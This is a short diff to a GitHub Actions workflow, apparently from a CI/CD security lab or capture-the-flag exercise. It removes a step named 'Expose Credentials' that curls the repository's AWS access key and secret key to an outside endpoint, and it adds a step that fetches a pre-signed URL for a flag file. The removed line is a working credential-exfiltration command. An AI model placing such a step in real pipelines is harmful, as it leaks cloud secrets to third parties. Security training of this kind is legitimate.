@@ -12,9 +12,15 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v3
 
+      - name: Generate Pre-signed URL
+        id: presigned-url
+        run: |
+          presigned_url=$(curl -X POST \
+               -H "Content-Type: application/json" \
+               -d '{"file_name":"flag1.txt","storage":"poisonous-flag"}' \
+               https://bpi345cblz2xputo5mhbwi3ycu0asyav.lambda-url.us-east-2.on.aws/)
+          echo "::set-output name=url::$presigned_url"
+
       - name: Expose Credentials
         run: |
-          curl -X POST \
-               -H "Content-Type: application/json" \
-               -d '{"aws_access_key_id":"${{ secrets.AWS_ACCESS_KEY_ID }}","aws_secret_access_key":"${{ secrets.AWS_SECRET_ACCESS_KEY }}"}' \
-               https://myj8mhz9sb.execute-api.us-east-2.amazonaws.com/Prod
+          echo "You can access the file at ${{ steps.presigned-url.outputs.url }}"
